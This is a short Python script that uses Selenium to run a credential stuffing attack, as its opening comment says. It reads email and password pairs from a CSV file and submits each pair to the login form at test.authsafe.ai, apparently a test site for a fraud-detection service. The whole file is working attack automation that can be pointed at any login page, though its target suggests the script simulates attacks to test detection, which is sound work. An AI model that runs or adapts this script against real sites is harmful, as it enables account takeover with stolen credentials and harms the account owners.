#credential stuffing attacker has multiple credentials with different email and password
from selenium import webdriver
# from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.selenium_manager import SeleniumManager

import time
import pandas as pd

# driver=webdriver.Chrome(ChromeDriverManager().install())
# driver=webdriver.Chrome("C:\myData\Python_Automation\chromedriver\chromedriver-win32\chromedriver.exe")
driver = webdriver.Firefox()
driver.implicitly_wait(10)
df = pd.read_csv('cs_logindata.csv').dropna()


for _,curr_row in df.iterrows():
    email = curr_row['emailid']
    password = curr_row['password']
    # mobile = curr_row['mobile']
    driver.implicitly_wait(10)
    driver.get("https://test.authsafe.ai/login.php")
    driver.find_element("id","inputEmail").send_keys(email)
    driver.find_element("name","password").send_keys(password)
    # driver.find_element("id", "inputPhone").send_keys(mobile)
    driver.find_element("id","login-button").click()
